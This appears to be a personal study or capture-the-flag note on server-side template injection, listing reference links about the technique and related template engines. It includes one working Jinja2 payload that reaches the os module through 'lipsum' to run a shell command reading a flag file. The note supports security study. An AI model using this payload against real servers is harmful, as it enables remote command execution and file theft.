https://portswigger.net/web-security/server-side-template-injection/exploiting
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
https://www.invicti.com/blog/web-security/exploiting-ssti-and-xss-in-cms-made-simple/
https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_paper.pdf
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

https://jinja.palletsprojects.com/en/3.1.x/templates/?highlight=lipsum#jinja-globals.lipsum
```
{{lipsum.__globals__.os.popen('cat flag.log').read()}}
```

https://github.com/dotboris/vuejs-serverside-template-xss

https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/

https://owasp.org/www-pdf-archive/Owasp_SSTI_final.pdf

- https://github.com/twigphp/Twig
- https://shopify.github.io/liquid/
- Jinja2